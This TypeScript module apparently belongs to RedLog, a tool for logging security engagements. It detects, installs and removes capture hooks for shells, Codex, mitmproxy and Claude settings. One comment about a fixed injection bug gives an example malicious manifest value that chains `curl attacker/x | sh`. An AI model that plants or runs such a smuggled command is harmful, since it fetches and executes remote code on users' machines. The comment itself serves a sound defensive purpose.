import { execSync, spawn, spawnSync } from 'child_process'
import { existsSync, readFileSync, writeFileSync, mkdirSync, copyFileSync } from 'fs'
import { dirname, join } from 'path'
import { homedir } from 'os'
import { bundledRoot } from './plugins/loader'
import { isDisabled } from './plugins/state'

export interface PluginManifest {
  id: string
  name: string
  description: string
  agentType: string
  /** E3: event subtypes this producer emits under agentType (see CaptureContribution.emits). */
  emits?: string[]
  requires: string[]
  hookFile: string
  /** Files installed beside hookFile, such as a shared shell transport. */
  supportFiles?: string[]
  installMethod: 'claude-settings' | 'shell-source' | 'manual'
  installTarget?: string
  shellRcFile?: string
  claudeSettingsMatcher?: string
  /** for installMethod 'manual', plugin-supplied setup steps (absolute paths filled at register time) */
  manualSteps?: ManualStep[]
  /** absolute plugin dir — set for capture entries contributed by a plugin. */
  _dir?: string
}

export interface ManualStep {
  /** what this step accomplishes */
  label: string
  /** copy-paste shell command, with the absolute hook path already resolved */
  command?: string
}

export interface PluginInfo {
  id: string
  name: string
  description: string
  agentType: string
  /** E3: event subtypes this producer emits under agentType, for feed health. */
  emits?: string[]
  installed: boolean
  available: boolean
  installMethod: 'claude-settings' | 'shell-source' | 'manual'
  hookFile: string
  /** for installMethod 'manual': ordered, copy-paste setup steps */
  manualSteps?: ManualStep[]
}

const HOOKS_DIR = join(__dirname, '../../../hooks')
function resolveDir(primary: string, fallback: string): string {
  return existsSync(primary) ? primary : fallback
}

// §8-2: the built-in producers are DECLARED in the bundled starter-pack
// manifest (plugins/starter-pack/plugin.json). This array is the FALLBACK — if
// that manifest is missing or unreadable in some build, hooks-manager uses this
// copy so capture can never go dark for want of a data file. The two must stay
// in sync; a parity test guards that. Kept as code, not deleted, precisely so
// the critical path has no single point of failure.
export const STARTER_PACK_FALLBACK: PluginManifest[] = [
  {
    id: 'shell-zsh',
    name: 'Zsh Shell',
    description: 'Captures commands and exit codes from zsh',
    agentType: 'shell',
    requires: [],
    hookFile: 'hooks/shell-zsh-hook.zsh',
    supportFiles: ['hooks/shell-common.sh'],
    installMethod: 'shell-source',
    installTarget: join(homedir(), '.redlog', 'shell-hook.zsh'),
    shellRcFile: '.zshrc'
  },
  {
    id: 'shell-bash',
    name: 'Bash Shell',
    description: 'Captures commands via preexec/precmd hooks',
    agentType: 'shell',
    requires: [],
    hookFile: 'hooks/shell-bash-hook.sh',
    supportFiles: ['hooks/shell-common.sh'],
    installMethod: 'shell-source',
    installTarget: join(homedir(), '.redlog', 'shell-bash-hook.sh'),
    shellRcFile: '.bashrc'
  },
  {
    id: 'codex',
    name: 'Codex',
    description: 'Wraps Codex shell to capture agent commands',
    agentType: 'shell',
    requires: ['codex'],
    hookFile: 'hooks/codex-wrapper.sh',
    installMethod: 'manual'
  },
  {
    id: 'mitmproxy',
    name: 'mitmproxy',
    description: 'Captures HTTP traffic via mitmproxy addon',
    agentType: 'http',
    requires: ['mitmproxy', 'mitmdump'],
    hookFile: 'hooks/mitmproxy-addon.py',
    installMethod: 'manual'
  },
  {
    id: 'shell-powershell',
    name: 'PowerShell',
    description: 'Captures commands from PowerShell via prompt hook',
    agentType: 'shell',
    requires: [],
    hookFile: 'hooks/shell-hook.ps1',
    installMethod: 'manual'
  },
  {
    id: 'shell-wsl',
    name: 'WSL (Bash)',
    description: 'Captures commands from WSL bash sessions — auto-resolves Windows token path',
    agentType: 'shell',
    requires: [],
    hookFile: 'hooks/shell-bash-hook.sh',
    supportFiles: ['hooks/shell-common.sh'],
    installMethod: 'manual'
  }
]

/** §8-2: read the built-in producers from the bundled starter-pack manifest.
 *  `~` in installTarget is expanded to the home dir (a static JSON can't call
 *  homedir()). Returns null on ANY problem — missing file, bad JSON, or a
 *  malformed/empty list — so the caller falls back to the in-code copy and the
 *  critical capture path never depends on a data file being present. */
function loadStarterPack(): PluginManifest[] | null {
  try {
    const file = join(bundledRoot(), 'starter-pack', 'plugin.json')
    if (!existsSync(file)) return null
    const raw = JSON.parse(readFileSync(file, 'utf-8')) as { builtinProducers?: unknown }
    const list = raw.builtinProducers
    if (!Array.isArray(list) || list.length === 0) return null
    const home = homedir()
    const out: PluginManifest[] = []
    for (const e of list as Array<Record<string, unknown>>) {
      if (typeof e.id !== 'string' || typeof e.hookFile !== 'string' || typeof e.agentType !== 'string'
        || typeof e.installMethod !== 'string') return null
      const installTarget = typeof e.installTarget === 'string'
        ? e.installTarget.replace(/^~(?=\/|$)/, home)
        : undefined
      out.push({
        id: e.id,
        name: typeof e.name === 'string' ? e.name : e.id,
        description: typeof e.description === 'string' ? e.description : '',
        agentType: e.agentType,
        requires: Array.isArray(e.requires) ? (e.requires as string[]) : [],
        hookFile: e.hookFile,
        supportFiles: Array.isArray(e.supportFiles) ? (e.supportFiles as string[]) : undefined,
        installMethod: e.installMethod as PluginManifest['installMethod'],
        installTarget,
        shellRcFile: typeof e.shellRcFile === 'string' ? e.shellRcFile : undefined,
        claudeSettingsMatcher: typeof e.claudeSettingsMatcher === 'string' ? e.claudeSettingsMatcher : undefined
      })
    }
    return out
  } catch { return null }
}

// The active registry: the starter-pack manifest when it loads, else the
// in-code fallback. Computed once at module load (the built-in set is static
// for a run). Bare ids are preserved — these ARE the built-ins, not namespaced
// plugin captures — so everything downstream (capture-health, the UI) that
// keys on `shell-zsh`/`mitmproxy` is unaffected.
const PLUGIN_REGISTRY: PluginManifest[] = loadStarterPack() ?? STARTER_PACK_FALLBACK

// Capture integrations contributed by plugins (🟢). Registered at load time and
// merged with the built-in registry, so plugin captures appear in the Hooks
// panel and can be installed/guided exactly like the built-ins.
const externalCaptures: PluginManifest[] = []

export function registerCapturePlugins(
  pluginId: string,
  dir: string,
  entries: Array<Omit<PluginManifest, 'requires'> & { requires?: string[] }>
): void {
  for (const e of entries) {
    // namespace the id so two plugins can't collide with each other or a built-in
    const id = e.id.startsWith(`${pluginId}.`) ? e.id : `${pluginId}.${e.id}`
    externalCaptures.push({ ...e, id, requires: e.requires ?? [], _dir: dir })
  }
}

export function unregisterCapturePlugins(pluginId: string): void {
  for (let i = externalCaptures.length - 1; i >= 0; i--) {
    if (externalCaptures[i].id.startsWith(`${pluginId}.`)) externalCaptures.splice(i, 1)
  }
}

function allManifests(): PluginManifest[] {
  // §8-2 true removability: the starter-pack IS the built-in producers, so
  // disabling it (Settings ▸ Plugins) actually removes them — they drop out of
  // the Hooks panel and capture-health, and come back on re-enable. Note this
  // is orthogonal to the robustness fallback: a MISSING/bad manifest still
  // yields the in-code STARTER_PACK_FALLBACK (see PLUGIN_REGISTRY); only an
  // explicit DISABLE removes them. So a bad data file can never take capture
  // dark, but an operator who wants a minimal RedLog can.
  const builtins = isDisabled('starter-pack') ? [] : PLUGIN_REGISTRY
  return [...builtins, ...externalCaptures]
}

// Absolute path to a manifest's hook script source. Plugin captures resolve
// inside the plugin dir; built-ins resolve against the shipped hooks directory.
function srcPathForRelative(plugin: PluginManifest, relative: string): string {
  if (plugin._dir) return join(plugin._dir, relative)
  const hooksDir = resolveDir(HOOKS_DIR, join(__dirname, '../../hooks'))
  return join(hooksDir, relative.replace('hooks/', ''))
}

function srcPathFor(plugin: PluginManifest): string {
  return srcPathForRelative(plugin, plugin.hookFile)
}

// For shell-source plugin captures without an explicit target, drop the hook in
// ~/.redlog under its own basename.
function installTargetFor(plugin: PluginManifest): string {
  if (plugin.installTarget) return plugin.installTarget
  const base = plugin.hookFile.split(/[\\/]/).pop() ?? `${plugin.id}.sh`
  return join(homedir(), '.redlog', base)
}

/** Resolve the complete, reviewable file set for a hook installation. The
 * adapter and every declared support file are colocated so relative sourcing
 * behaves the same in the repository and under ~/.redlog. */
export function getHookInstallPlan(pluginId: string): Array<{ source: string; target: string }> | null {
  const plugin = allManifests().find((candidate) => candidate.id === pluginId)
  if (!plugin || plugin.installMethod !== 'shell-source') return null
  const target = installTargetFor(plugin)
  return [
    { source: srcPathFor(plugin), target },
    ...(plugin.supportFiles ?? []).map((relative) => ({
      source: srcPathForRelative(plugin, relative),
      target: join(dirname(target), relative.split(/[\\/]/).pop() ?? relative)
    }))
  ]
}

// Which shell rc a shell-source hook appends to. Explicit wins; otherwise pick
// by the operator's login shell.
function shellRcFor(plugin: PluginManifest): string {
  if (plugin.shellRcFile) return plugin.shellRcFile
  return process.env.SHELL?.includes('zsh') ? '.zshrc' : '.bashrc'
}

// Per-command lookup cache.  `where.exe` on Windows costs 70-300ms per call
// (PATH walk + PATHEXT expansion), and the answer virtually never changes
// during a session.  Cache indefinitely; `invalidateCommandCache()` resets
// after an install/uninstall so the next `detectHooks()` re-probes.
const _cmdCache = new Map<string, boolean>()
export function invalidateCommandCache(): void { _cmdCache.clear() }

function commandExists(cmd: string): boolean {
  const hit = _cmdCache.get(cmd)
  if (hit !== undefined) return hit
  // v0.6.93 P0-B: was `execSync(`which ${cmd}`)` — the plugin manifest's
  // `requires[]` string flows into a shell, so a malicious manifest like
  // `requires: ["nmap; curl attacker/x | sh #"]` executes arbitrary shell.
  // spawnSync with explicit argv keeps the string as one process argument
  // and never touches a shell.
  try {
    const probeCmd = process.platform === 'win32' ? 'where' : 'which'
    const result = spawnSync(probeCmd, [cmd], { stdio: 'ignore' })
    const found = result.status === 0
    _cmdCache.set(cmd, found)
    return found
  } catch {
    _cmdCache.set(cmd, false)
    return false
  }
}

function commandExistsAsync(cmd: string): Promise<boolean> {
  const hit = _cmdCache.get(cmd)
  if (hit !== undefined) return Promise.resolve(hit)
  return new Promise((resolve) => {
    try {
      const probeCmd = process.platform === 'win32' ? 'where' : 'which'
      const child = spawn(probeCmd, [cmd], { stdio: 'ignore' })
      child.on('close', (code) => {
        const found = code === 0
        _cmdCache.set(cmd, found)
        resolve(found)
      })
      child.on('error', () => {
        _cmdCache.set(cmd, false)
        resolve(false)
      })
    } catch {
      _cmdCache.set(cmd, false)
      resolve(false)
    }
  })
}

function isClaudeSettingsInstalled(matcher: string): boolean {
  const settingsPath = join(homedir(), '.claude', 'settings.json')
  if (!existsSync(settingsPath)) return false
  try {
    const settings = JSON.parse(readFileSync(settingsPath, 'utf-8'))
    const hooks = settings?.hooks?.PostToolUse
    if (!Array.isArray(hooks)) return false
    return hooks.some((h: { hooks?: Array<{ command?: string }> }) =>
      h.hooks?.some((hk) => hk.command?.includes(matcher))
    )
  } catch {
    return false
  }
}

function isShellSourceInstalled(rcFile: string, hookPath: string): boolean {
  if (!existsSync(hookPath)) return false
  const rcPath = join(homedir(), rcFile)
  if (!existsSync(rcPath)) return false
  const content = readFileSync(rcPath, 'utf-8')
  const hookName = hookPath.split(/[\\/]/).pop() ?? ''
  return content.includes(hookName)
}

// Default claude-settings matcher for a plugin capture: the hook's basename, so
// install/uninstall/detect all key off the same string.
function matcherFor(plugin: PluginManifest): string {
  return plugin.claudeSettingsMatcher ?? (plugin._dir ? (plugin.hookFile.split(/[\\/]/).pop() ?? plugin.id) : plugin.id)
}

function checkInstalled(plugin: PluginManifest): boolean {
  switch (plugin.installMethod) {
    case 'claude-settings':
      return isClaudeSettingsInstalled(matcherFor(plugin))
    case 'shell-source':
      return isShellSourceInstalled(plugin.shellRcFile ?? '.zshrc', installTargetFor(plugin))
    case 'manual':
      return false
  }
}

function checkAvailable(plugin: PluginManifest): boolean {
  if (plugin.requires.length === 0) {
    if (plugin.id === 'shell-powershell') return process.platform === 'win32'
    if (plugin.id === 'shell-wsl') {
      if (process.platform !== 'win32') return false
      return commandExists('wsl')
    }
    if (plugin.id === 'shell-zsh') return process.env.SHELL?.includes('zsh') || existsSync('/bin/zsh')
    if (plugin.id === 'shell-bash') {
      return existsSync('/bin/bash') || (process.platform === 'win32' && commandExists('bash'))
    }
    return true
  }
  return plugin.requires.some((cmd) => commandExists(cmd))
}

async function checkAvailableAsync(plugin: PluginManifest): Promise<boolean> {
  if (plugin.requires.length === 0) {
    if (plugin.id === 'shell-powershell') return process.platform === 'win32'
    if (plugin.id === 'shell-wsl') {
      if (process.platform !== 'win32') return false
      return commandExistsAsync('wsl')
    }
    if (plugin.id === 'shell-zsh') return process.env.SHELL?.includes('zsh') || existsSync('/bin/zsh')
    if (plugin.id === 'shell-bash') {
      return existsSync('/bin/bash') || (process.platform === 'win32' && await commandExistsAsync('bash'))
    }
    return true
  }
  for (const cmd of plugin.requires) {
    if (await commandExistsAsync(cmd)) return true
  }
  return false
}

// Manual hooks can't be a persistent one-click install: mitmproxy needs a
// running external process and codex changes how the agent's shell is launched.
// Instead of a dead "Manual" label, hand the operator exact copy-paste commands
// with the absolute hook path already resolved for this install.
function buildManualSteps(pluginId: string, hookFile: string): ManualStep[] | undefined {
  switch (pluginId) {
    case 'mitmproxy':
      return [
        {
          label: 'Install mitmproxy (skip if already installed)',
          command: 'pip install mitmproxy'
        },
        {
          label: process.platform === 'win32'
            ? 'Ensure the pip Scripts directory is in your PATH (restart terminal after running this)'
            : 'Verify mitmdump is on your PATH',
          command: process.platform === 'win32'
            ? 'python -c "import sysconfig; print(sysconfig.get_path(\'scripts\'))"'
            : 'which mitmdump'
        },
        {
          label: 'Start mitmproxy with the RedLog addon (keep it running during the engagement)',
          command: `mitmdump -s "${hookFile}"`
        },
        {
          label: 'Route traffic through it — proxy your browser/tools at 127.0.0.1:8080, or use Launch Browser in RedLog which wires the proxy for you'
        }
      ]
    case 'codex':
      // codex-wrapper.sh is a bash script using POSIX-shell idioms (and the
      // `SHELL=… cmd` inline-env prefix). Those don't run in cmd/PowerShell, so
      // on Windows point at WSL/Git Bash with a note instead of a command that
      // would just error when pasted.
      if (process.platform === 'win32') {
        return [
          {
            label: 'The Codex wrapper is a bash script — run it inside WSL or Git Bash (cmd/PowerShell cannot execute it). Inside that shell, use the same commands shown on macOS/Linux, adjusting the path for that environment.'
          }
        ]
      }
      return [
        {
          label: 'Point Codex CLI at the command wrapper',
          command: `SHELL="${hookFile}" codex run "scan the target"`
        },
        {
          label: 'For an interactive shell, install its Bash or Zsh hook from this page'
        }
      ]
    case 'shell-powershell':
      return [
        {
          label: 'Add to your PowerShell profile so it loads on every session',
          command: `Add-Content $PROFILE '. "${hookFile}"'`
        },
        {
          label: 'Or source it manually in the current session',
          command: `. "${hookFile}"`
        }
      ]
    case 'shell-wsl': {
      const wslHookPath = hookFile.replace(/\\/g, '/').replace(/^([A-Z]):/, (_m, d: string) => `/mnt/${d.toLowerCase()}`)
      return [
        {
          label: 'Add to your WSL ~/.bashrc so it loads on every session',
          command: `echo 'source "${wslHookPath}"' >> ~/.bashrc`
        },
        {
          label: 'Or source it manually in the current WSL session',
          command: `source "${wslHookPath}"`
        }
      ]
    }
    default:
      return undefined
  }
}

export function detectHooks(): PluginInfo[] {
  return allManifests().map((plugin) => {
    const hookFile = srcPathFor(plugin)
    const manualSteps = plugin.installMethod === 'manual'
      ? (plugin.manualSteps ?? buildManualSteps(plugin.id, hookFile))
      : undefined

    return {
      id: plugin.id,
      name: plugin.name,
      description: plugin.description,
      agentType: plugin.agentType,
      emits: plugin.emits,
      installed: checkInstalled(plugin),
      available: checkAvailable(plugin),
      installMethod: plugin.installMethod,
      hookFile,
      manualSteps
    }
  })
}

let _detectCache: PluginInfo[] | null = null

export async function detectHooksAsync(): Promise<PluginInfo[]> {
  const manifests = allManifests()
  const results = await Promise.all(manifests.map(async (plugin) => {
    const hookFile = srcPathFor(plugin)
    const manualSteps = plugin.installMethod === 'manual'
      ? (plugin.manualSteps ?? buildManualSteps(plugin.id, hookFile))
      : undefined
    return {
      id: plugin.id,
      name: plugin.name,
      description: plugin.description,
      agentType: plugin.agentType,
      emits: plugin.emits,
      installed: checkInstalled(plugin),
      available: await checkAvailableAsync(plugin),
      installMethod: plugin.installMethod,
      hookFile,
      manualSteps
    }
  }))
  _detectCache = results
  return results
}

export function getCachedHooks(): PluginInfo[] | null {
  return _detectCache
}

export function invalidateHooksCache(): void {
  _detectCache = null
}

export function installHook(pluginId: string): { success: boolean; message: string } {
  const plugin = allManifests().find((p) => p.id === pluginId)
  if (!plugin) return { success: false, message: `Unknown plugin: ${pluginId}` }

  switch (plugin.installMethod) {
    case 'claude-settings': {
      const hookFile = srcPathFor(plugin)
      const settingsPath = join(homedir(), '.claude', 'settings.json')
      try {
        mkdirSync(join(homedir(), '.claude'), { recursive: true })
        let settings: Record<string, unknown> = {}
        if (existsSync(settingsPath)) {
          settings = JSON.parse(readFileSync(settingsPath, 'utf-8'))
        }
        if (!settings.hooks) settings.hooks = {}
        const hooks = settings.hooks as Record<string, unknown>
        if (!hooks.PostToolUse) hooks.PostToolUse = []
        const postTool = hooks.PostToolUse as Array<Record<string, unknown>>
        const matcher = matcherFor(plugin)
        const exists = postTool.some((h) =>
          (h.hooks as Array<{ command?: string }>)?.some((hk) => hk.command?.includes(matcher))
        )
        if (!exists) {
          postTool.push({
            matcher: 'Bash',
            hooks: [{ command: existsSync(hookFile) ? hookFile : `redlog-hooks/${plugin.hookFile.replace('hooks/', '')}` }]
          })
        }
        writeFileSync(settingsPath, JSON.stringify(settings, null, 2))
        return { success: true, message: `${plugin.name} hook added to ~/.claude/settings.json` }
      } catch (e) {
        return { success: false, message: `Failed: ${e}` }
      }
    }
    case 'shell-source': {
      // Refuse on Windows — appending `source <path>` to a fabricated
      // %USERPROFILE%\.bashrc silently corrupts profiles when the user
      // isn't running Git Bash. PowerShell setup is a manual `$PROFILE`
      // paste per docs/windows-setup.md. Audit P0-3.
      if (process.platform === 'win32') {
        return {
          success: false,
          message: `${plugin.name}: shell-source install is not supported on Windows. See docs/windows-setup.md for the PowerShell $PROFILE setup.`
        }
      }
      try {
        const plan = getHookInstallPlan(plugin.id)
        if (!plan || plan.length === 0) throw new Error('Empty hook install plan')
        const dest = plan[0].target
        mkdirSync(join(homedir(), '.redlog'), { recursive: true })
        for (const file of plan) {
          if (!existsSync(file.source)) throw new Error(`Missing hook file: ${file.source}`)
          copyFileSync(file.source, file.target)
        }
        const rcFile = shellRcFor(plugin)
        const rcPath = join(homedir(), rcFile)
        let content = existsSync(rcPath) ? readFileSync(rcPath, 'utf-8') : ''
        const hookName = dest.split(/[\\/]/).pop()
        if (!content.includes(hookName!)) {
          content += `\n# RedLog shell hook\nsource ${dest}\n`
          writeFileSync(rcPath, content)
        }
        return { success: true, message: `${plugin.name} hook installed. Run: source ~/${rcFile}` }
      } catch (e) {
        return { success: false, message: `Failed: ${e}` }
      }
    }
    case 'manual':
      return { success: false, message: `Manual setup required for ${plugin.name}` }
  }
}

export function uninstallHook(pluginId: string): { success: boolean; message: string } {
  const plugin = allManifests().find((p) => p.id === pluginId)
  if (!plugin) return { success: false, message: `Unknown plugin: ${pluginId}` }

  switch (plugin.installMethod) {
    case 'claude-settings': {
      const settingsPath = join(homedir(), '.claude', 'settings.json')
      try {
        if (!existsSync(settingsPath)) return { success: true, message: 'Already removed' }
        const settings = JSON.parse(readFileSync(settingsPath, 'utf-8'))
        const postTool = settings?.hooks?.PostToolUse as Array<Record<string, unknown>> | undefined
        const matcher = matcherFor(plugin)
        if (postTool) {
          settings.hooks.PostToolUse = postTool.filter((h) =>
            !(h.hooks as Array<{ command?: string }>)?.some((hk) => hk.command?.includes(matcher))
          )
        }
        writeFileSync(settingsPath, JSON.stringify(settings, null, 2))
        return { success: true, message: `${plugin.name} hook removed` }
      } catch (e) {
        return { success: false, message: `Failed: ${e}` }
      }
    }
    case 'shell-source': {
      try {
        const rcFile = shellRcFor(plugin)
        const rcPath = join(homedir(), rcFile)
        const dest = installTargetFor(plugin)
        if (existsSync(rcPath)) {
          let content = readFileSync(rcPath, 'utf-8')
          const escapedDest = dest.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
          content = content.replace(new RegExp(`\\n?# RedLog shell hook\\nsource ${escapedDest}\\n?`, 'g'), '\n')
          writeFileSync(rcPath, content)
        }
        return { success: true, message: `${plugin.name} hook removed. Run: source ~/${rcFile}` }
      } catch (e) {
        return { success: false, message: `Failed: ${e}` }
      }
    }
    case 'manual':
      return { success: false, message: `Manual removal required for ${plugin.name}` }
  }
}
